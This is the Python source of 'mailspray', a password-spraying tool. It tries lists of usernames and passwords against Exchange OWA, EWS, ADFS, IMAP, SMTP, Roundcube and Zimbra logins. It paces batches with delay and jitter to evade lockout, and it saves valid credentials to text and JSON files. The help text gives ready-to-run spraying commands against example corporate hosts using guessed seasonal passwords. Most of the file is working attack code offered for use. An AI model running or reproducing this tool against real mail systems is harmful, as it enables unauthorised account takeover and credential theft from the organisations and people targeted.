#!/usr/bin/env python3

import sys
import os
import time
import random
import argparse
import threading
import warnings
import json
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed

warnings.filterwarnings("ignore", category=DeprecationWarning)
warnings.filterwarnings("ignore", message=".*urllib3.*")

sys.path.append(os.path.dirname(os.path.abspath(__file__)))

try:
    from modules import OWAModule, IMAPModule, SMTPModule, RoundcubeModule, EWSModule, ZimbraModule, ADFSModule
except ImportError as e:
    print(f"\033[1;31m[!]\033[0m Missing dependency: {e}")
    print(f"\033[1;33m[*]\033[0m Run: pip3 install requests")
    sys.exit(1)

__version__ = "0.4.1"

# ── Colors ──────────────────────────────────────────────────────────

class C:
    R   = "\033[1;31m"    # red
    G   = "\033[1;32m"    # green
    Y   = "\033[1;33m"    # yellow
    B   = "\033[1;34m"    # blue
    C   = "\033[1;36m"    # cyan
    W   = "\033[1;37m"    # white
    D   = "\033[2m"       # dim
    X   = "\033[0m"       # reset

    @staticmethod
    def off():
        C.R = C.G = C.Y = C.B = C.C = C.W = C.D = C.X = ""


# ── Output helpers (NetExec style) ──────────────────────────────────

PROTOCOLS = {
    "owa":       {"name": "OWA",       "cls": OWAModule,       "port": 443},
    "ews":       {"name": "EWS",       "cls": EWSModule,       "port": 443},
    "adfs":      {"name": "ADFS",      "cls": ADFSModule,      "port": 443},
    "imap":      {"name": "IMAP",      "cls": IMAPModule,      "port": 993},
    "smtp":      {"name": "SMTP",      "cls": SMTPModule,      "port": 587},
    "roundcube": {"name": "RCUBE",     "cls": RoundcubeModule, "port": 443},
    "zimbra":    {"name": "ZIMBRA",    "cls": ZimbraModule,    "port": 443},
}

# Default username format per protocol when --user-format auto is used
# domain_prefix → CORP\user   (Exchange native, NTLM-style)
# upn           → user@domain (UPN, required by ADFS; typical for Zimbra/Roundcube)
# plain         → user        (no domain applied — SMTP/IMAP depend on server config)
PROTOCOL_USER_FORMAT = {
    "owa":       "domain_prefix",
    "ews":       "domain_prefix",
    "adfs":      "upn",
    "imap":      "plain",
    "smtp":      "plain",
    "roundcube": "upn",
    "zimbra":    "upn",
}

def proto_tag(name):
    return f"{C.B}{name:<7}{C.X}"

def log_success(proto, target, user, password):
    print(f"  {proto_tag(proto)} {target:<28} {C.G}[+]{C.X} {user}:{C.G}{password}{C.X}")

def log_fail(proto, target, user, password):
    print(f"  {proto_tag(proto)} {target:<28} {C.R}[-]{C.X} {user}:{C.D}{password}{C.X}")

def log_error(proto, target, user, msg):
    print(f"  {proto_tag(proto)} {target:<28} {C.Y}[!]{C.X} {user} — {C.Y}{msg}{C.X}")

def log_skip(proto, target, user, reason):
    print(f"  {proto_tag(proto)} {target:<28} {C.D}[~]{C.X} {user} — {C.D}{reason}{C.X}")

def log_info(msg):
    print(f"  {C.C}[*]{C.X} {msg}")

def log_warn(msg):
    print(f"  {C.Y}[!]{C.X} {msg}")

def log_good(msg):
    print(f"  {C.G}[+]{C.X} {msg}")


# ── Input parsing ───────────────────────────────────────────────────

def load_list(value):
    """Load from file (one per line) or treat as single value."""
    if os.path.isfile(value):
        with open(value, "r") as f:
            return [l.strip() for l in f if l.strip() and not l.startswith("#")]
    return [value]



# ── Spray engine ────────────────────────────────────────────────────

class SprayEngine:
    def __init__(self, args):
        self.args = args
        self.lock = threading.Lock()
        self.found = []
        self._found_data = []       # structured records for JSON output
        self._user_attempts = {}    # {username: attempt_count} — lockout tracking
        self._user_found = set()    # usernames with at least one valid cred
        self.total = 0
        self.done = 0
        self.skipped = 0
        self.errors = 0
        self.start_time = None
        self._interrupted = False

    def _batch_delay(self):
        """Delay between batches — not per-request."""
        if self.args.delay > 0:
            jitter = self.args.jitter * self.args.delay
            sleep_time = max(0, self.args.delay + random.uniform(-jitter, jitter))
            time.sleep(sleep_time)

    def _save(self, proto, target_display, user, password):
        host = target_display
        if "://" in host:
            host = host.split("://", 1)[1]
        host = host.rstrip("/")
        uri = f"{proto}://{user}:{password}@{host}"
        with self.lock:
            self.found.append(uri)
            self._found_data.append({
                "protocol": proto,
                "host": host,
                "username": user,
                "password": password,
                "timestamp": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
            })
            if self.args.output:
                with open(self.args.output, "a") as f:
                    f.write(uri + "\n")

    def _worker(self, scanner, user, password, proto_key, target):
        proto_name = PROTOCOLS[proto_key]["name"]

        with self.lock:
            if self.args.stop_on_success and user in self._user_found:
                self.done += 1
                self.skipped += 1
                if self.args.verbose:
                    log_skip(proto_name, target, user, "already found")
                return
            if self.args.max_attempts > 0:
                if self._user_attempts.get(user, 0) >= self.args.max_attempts:
                    self.done += 1
                    self.skipped += 1
                    if self.args.verbose:
                        log_skip(proto_name, target, user,
                                 f"max attempts ({self.args.max_attempts})")
                    return

        try:
            result = scanner.login(user, password)
        except Exception as e:
            with self.lock:
                self.errors += 1
                self.done += 1
                self._user_attempts[user] = self._user_attempts.get(user, 0) + 1
            if self.args.verbose:
                log_error(proto_name, target, user, str(e)[:60])
            return

        with self.lock:
            self.done += 1
            self._user_attempts[user] = self._user_attempts.get(user, 0) + 1
            if result:
                self._user_found.add(user)

        if result:
            log_success(proto_name, target, user, password)
            self._save(proto_key, target, user, password)
        elif self.args.verbose:
            log_fail(proto_name, target, user, password)

    # ── Progress ──

    def _progress_thread(self):
        while not self._stop_progress.is_set():
            self._print_progress()
            self._stop_progress.wait(1)
        self._clear_progress()

    def _print_progress(self):
        with self.lock:
            done = self.done
            found = len(self.found)
            errors = self.errors
            skipped = self.skipped

        elapsed = time.time() - self.start_time
        pct = (done / self.total * 100) if self.total else 0
        actual = done - skipped
        rps = f"{actual / elapsed:.1f}" if elapsed > 1 else "-"
        eta_str = ""
        if done > 0 and done < self.total:
            eta_sec = (elapsed / done) * (self.total - done)
            eta_str = f" ETA {_fmt_duration(eta_sec)}"

        line = (f"  {C.D}[{pct:5.1f}%]{C.X} "
                f"{done}/{self.total}  "
                f"{C.G}{found} found{C.X}  "
                f"{C.Y}{errors} err{C.X}  "
                f"{rps} req/s"
                f"{eta_str}")
        sys.stderr.write(f"\r{line}  \033[K")
        sys.stderr.flush()

    def _clear_progress(self):
        sys.stderr.write("\r\033[K")
        sys.stderr.flush()

    # ── Main loop: batch-based ──
    # Fires batch of -t concurrent requests, waits --delay, next batch.
    # With -t 100 --delay 30: 100 requests every 30s = 3.3 req/s.

    def run(self, scanner, pairs, proto_key, target):
        self.total = len(pairs)
        self.start_time = time.time()
        batch_size = self.args.threads

        self._stop_progress = threading.Event()
        progress = threading.Thread(target=self._progress_thread, daemon=True)
        progress.start()

        try:
            for i in range(0, len(pairs), batch_size):
                if self._interrupted:
                    break

                batch = pairs[i:i + batch_size]

                with ThreadPoolExecutor(max_workers=len(batch)) as pool:
                    futures = [
                        pool.submit(self._worker, scanner, u, p, proto_key, target)
                        for u, p in batch
                    ]
                    for f in as_completed(futures):
                        pass

                # delay between batches, skip after last batch
                if self.args.delay > 0 and (i + batch_size) < len(pairs):
                    self._batch_delay()

        except KeyboardInterrupt:
            self._interrupted = True
            self._clear_progress()
            log_warn("Interrupted by user")

        self._stop_progress.set()
        progress.join(timeout=1)
        self._summary()

    def _summary(self):
        elapsed = time.time() - self.start_time
        actual = self.done - self.skipped
        rps = f"{actual / elapsed:.1f}" if elapsed > 0 else "-"

        print()
        print(f"  {C.W}{'─' * 58}{C.X}")

        stats = (f"{C.G}{len(self.found)} found{C.X}  /  "
                 f"{self.done} tested  /  "
                 f"{C.Y}{self.errors} errors{C.X}")
        if self.skipped:
            stats += f"  /  {C.D}{self.skipped} skipped{C.X}"
        stats += f"  /  {_fmt_duration(elapsed)}  /  {C.C}{rps} req/s{C.X}"

        print(f"  {C.W}Results:{C.X}  {stats}")

        if self.found:
            print(f"  {C.W}Creds:{C.X}")
            for uri in self.found:
                print(f"    {C.G}{uri}{C.X}")
            if self.args.output:
                print(f"  {C.W}Saved:{C.X}   {self.args.output}")

        if self.args.json_output and self._found_data:
            with open(self.args.json_output, "w") as f:
                json.dump(self._found_data, f, indent=2)
            print(f"  {C.W}JSON:{C.X}    {self.args.json_output}")

        print(f"  {C.W}{'─' * 58}{C.X}")
        print()


# ── CLI ─────────────────────────────────────────────────────────────

BANNER = f"""\
{C.R}
    ███╗   ███╗ █████╗ ██╗██╗     ███████╗██████╗ ██████╗  █████╗ ██╗   ██╗
    ████╗ ████║██╔══██╗██║██║     ██╔════╝██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
    ██╔████╔██║███████║██║██║     ███████╗██████╔╝██████╔╝███████║ ╚████╔╝
    ██║╚██╔╝██║██╔══██║██║██║     ╚════██║██╔═══╝ ██╔══██╗██╔══██║  ╚██╔╝
    ██║ ╚═╝ ██║██║  ██║██║███████╗███████║██║     ██║  ██║██║  ██║   ██║
    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝{C.X}
                                          {C.C}v{__version__}{C.X} {C.D}// mail password spraying toolkit{C.X}"""


def _fmt_duration(seconds):
    """Format seconds into human-readable duration."""
    if seconds < 60:
        return f"{int(seconds)}s"
    elif seconds < 3600:
        m, s = divmod(int(seconds), 60)
        return f"{m}m {s}s"
    elif seconds < 86400:
        h, rem = divmod(int(seconds), 3600)
        m = rem // 60
        return f"{h}h {m}m"
    else:
        d, rem = divmod(int(seconds), 86400)
        h = rem // 3600
        return f"{d}d {h}h"


def build_parser():
    parser = argparse.ArgumentParser(
        prog="mailspray",
        description=BANNER,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        add_help=False,
    )

    target = parser.add_argument_group(f"{C.W}TARGET{C.X}")
    target.add_argument("protocol", choices=list(PROTOCOLS.keys()),
                        metavar="PROTOCOL",
                        help=f"Protocol: {', '.join(PROTOCOLS.keys())}")
    target.add_argument("target", metavar="TARGET",
                        help="Host, IP, or URL (e.g. http://mail.corp.com:8080)")
    target.add_argument("-P", "--port", type=int, metavar="PORT",
                        help="Override default port")

    auth = parser.add_argument_group(f"{C.W}CREDENTIALS{C.X}")
    auth.add_argument("-u", "--user", required=True, metavar="USER",
                      help="Username or file with usernames")
    auth.add_argument("-p", "--password", required=True, metavar="PASS",
                      help="Password or file with passwords")
    auth.add_argument("-d", "--domain", metavar="DOMAIN",
                      help="Domain to apply to usernames (format chosen automatically per protocol)")
    auth.add_argument("--user-format", choices=["auto", "domain_prefix", "upn", "plain"],
                      default="auto", metavar="FMT",
                      help="Override username format: auto (default), domain_prefix (CORP\\user), upn (user@domain), plain (no domain)")

    engine = parser.add_argument_group(f"{C.W}ENGINE{C.X}")
    engine.add_argument("-t", "--threads", type=int, default=5, metavar="N",
                        help="Batch size: concurrent requests per round (default: 5)")
    engine.add_argument("--fast", action="store_true",
                        help="Fast mode for internal targets: 30 threads, no delay (overrides -t if not set)")
    engine.add_argument("--delay", type=float, default=0.0, metavar="SEC",
                        help="Delay between batches in seconds (not per-request)")
    engine.add_argument("--jitter", type=float, default=0.0, metavar="0-1",
                        help="Jitter factor for delay (0.0-1.0)")
    engine.add_argument("--timeout", type=int, default=10, metavar="SEC",
                        help="Connection timeout (default: 10)")
    engine.add_argument("--max-attempts", type=int, default=0, metavar="N",
                        help="Max login attempts per user before skipping (0 = unlimited)")
    engine.add_argument("--stop-on-success", action="store_true",
                        help="Skip remaining passwords for a user after first success")

    output = parser.add_argument_group(f"{C.W}OUTPUT{C.X}")
    output.add_argument("-o", "--output", default="found.txt", metavar="FILE",
                        help="Output file for valid creds (default: found.txt)")
    output.add_argument("--json", dest="json_output", metavar="FILE",
                        help="Save found credentials to JSON file")
    output.add_argument("-v", "--verbose", action="store_true",
                        help="Show failed attempts, skips, and errors")
    output.add_argument("--no-color", action="store_true",
                        help="Disable colored output")

    misc = parser.add_argument_group(f"{C.W}MISC{C.X}")
    misc.add_argument("-h", "--help", action="help",
                      help="Show this help message")
    misc.add_argument("-V", "--version", action="version",
                      version=f"mailspray v{__version__}",
                      help="Show version")

    parser.epilog = f"""{C.W}USAGE EXAMPLES:{C.X}
  {C.D}# External OWA — safe defaults: 5 threads, delay 30s, max 3 attempts per user{C.X}
  mailspray owa mail.corp.com -u users.txt -p 'Winter2026!' -d CORP \\
    --max-attempts 3 --stop-on-success --delay 30 --jitter 0.3

  {C.D}# External ADFS — UPN auto-applied, same safe settings{C.X}
  mailspray adfs adfs.corp.com -u users.txt -p passes.txt -d corp.local \\
    --max-attempts 3 --stop-on-success --delay 30 --jitter 0.3

  {C.D}# External EWS — may be open even when OWA is firewalled{C.X}
  mailspray ews https://mail.corp.com -u users.txt -p passes.txt -d CORP \\
    --max-attempts 3 --stop-on-success --delay 20 --jitter 0.5

  {C.D}# Internal/local target — --fast sets 30 threads, no delay{C.X}
  mailspray imap 192.168.1.10 -u users.txt -p 'Password1' --fast
  mailspray owa 10.10.10.5 -u users.txt -p passes.txt -d CORP --fast --max-attempts 3

  {C.D}# SMTP external — no domain by default; add if server requires email format{C.X}
  mailspray smtp smtp.target.com -u emails.txt -p passwords.txt --delay 5 --jitter 0.4
  mailspray smtp smtp.corp.com -u users.txt -p passes.txt -d corp.local --user-format upn

  {C.D}# Roundcube on custom HTTP port{C.X}
  mailspray roundcube http://mail.corp.com:8080 -u users.txt -p pass.txt -d corp.com

  {C.D}# Zimbra + JSON output{C.X}
  mailspray zimbra http://webmail.target.com:8443 -u users.txt -p 'Spring2026!' \\
    -d target.com --json results.json

{C.W}SUPPORTED PROTOCOLS:{C.X}
  owa          Outlook Web Access (Exchange)           [443]  auto: CORP\\user
  ews          Exchange Web Services (NTLM/Basic)      [443]  auto: CORP\\user
  adfs         AD Federation Services (WS-Trust)       [443]  auto: user@domain
  imap         IMAP with SSL/STARTTLS                  [993]  auto: plain
  smtp         SMTP with STARTTLS                      [587]  auto: plain
  roundcube    Roundcube Webmail                       [443]  auto: user@domain
  zimbra       Zimbra Webmail                          [443]  auto: user@domain
"""
    return parser


def main():
    if len(sys.argv) == 1:
        build_parser().print_help()
        sys.exit(0)

    parser = build_parser()
    args = parser.parse_args()

    if args.no_color:
        C.off()

    # ── Build credential pairs ──
    users = load_list(args.user)
    passwords = load_list(args.password)
    if not users:
        parser.error("No usernames provided")
    if not passwords:
        parser.error("No passwords provided")

    if args.domain:
        fmt = args.user_format if args.user_format != "auto" else PROTOCOL_USER_FORMAT[args.protocol]
        if fmt == "plain":
            log_warn(f"Protocol {args.protocol.upper()} uses plain usernames — "
                     f"domain '{args.domain}' not applied automatically. "
                     f"Use --user-format upn or domain_prefix to override.")
        elif fmt == "upn":
            users = [f"{u}@{args.domain}" if "\\" not in u and "@" not in u else u for u in users]
        else:  # domain_prefix
            users = [f"{args.domain}\\{u}" if "\\" not in u and "@" not in u else u for u in users]

    # password spraying order: each password against all users first
    pairs = []
    for p in passwords:
        for u in users:
            pairs.append((u, p))

    # ── Fast mode (internal/local targets) ──
    # Only bumps threads if user didn't pass -t explicitly
    _threads_default = 5
    if args.fast:
        if args.threads == _threads_default:
            args.threads = 30
        if args.delay == 0.0:
            pass  # keep no delay — intentional

    # ── Init scanner ──
    proto = PROTOCOLS[args.protocol]
    scanner = proto["cls"](args.target)
    scanner.timeout = args.timeout

    if args.port:
        scanner.port = args.port

    # ── Pre-flight ──
    print(BANNER)
    print()

    target_url = scanner.base_url()
    mode = f"{C.Y}FAST{C.X}" if args.fast else f"{C.D}normal{C.X}"

    print(f"  {proto_tag(proto['name'])} {C.W}{target_url}{C.X}")

    if args.domain:
        fmt = args.user_format if args.user_format != "auto" else PROTOCOL_USER_FORMAT[args.protocol]
        fmt_labels = {
            "domain_prefix": f"{args.domain}\\\\user",
            "upn":           f"user@{args.domain}",
            "plain":         "plain (no domain)",
        }
        log_info(f"Format: {C.W}{fmt_labels[fmt]}{C.X}")

    log_info(f"Users: {C.W}{len(users)}{C.X}  |  Passwords: {C.W}{len(passwords)}{C.X}  |  Combinations: {C.W}{len(pairs)}{C.X}")
    log_info(f"Threads: {C.W}{args.threads}{C.X}  |  Mode: {mode}")

    if args.delay > 0:
        log_info(f"Delay: {C.W}{args.delay}s{C.X} (jitter: {args.jitter})")
        # ETA: each batch = threads concurrent, then delay
        batches = (len(pairs) + args.threads - 1) // args.threads
        eta_sec = batches * args.delay
        log_info(f"ETA: {C.Y}~{_fmt_duration(eta_sec)}{C.X} {C.D}(estimated with delay, actual may vary){C.X}")
    else:
        log_info(f"Delay: {C.D}none{C.X}")

    if args.max_attempts > 0:
        log_info(f"Max attempts/user: {C.W}{args.max_attempts}{C.X}")
    if args.stop_on_success:
        log_info(f"Stop-on-success: {C.W}enabled{C.X}")

    print()

    # ── Run ──
    engine = SprayEngine(args)
    engine.run(scanner, pairs, args.protocol, scanner.base_url())


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print()
        log_warn("Interrupted by user")
        sys.exit(0)
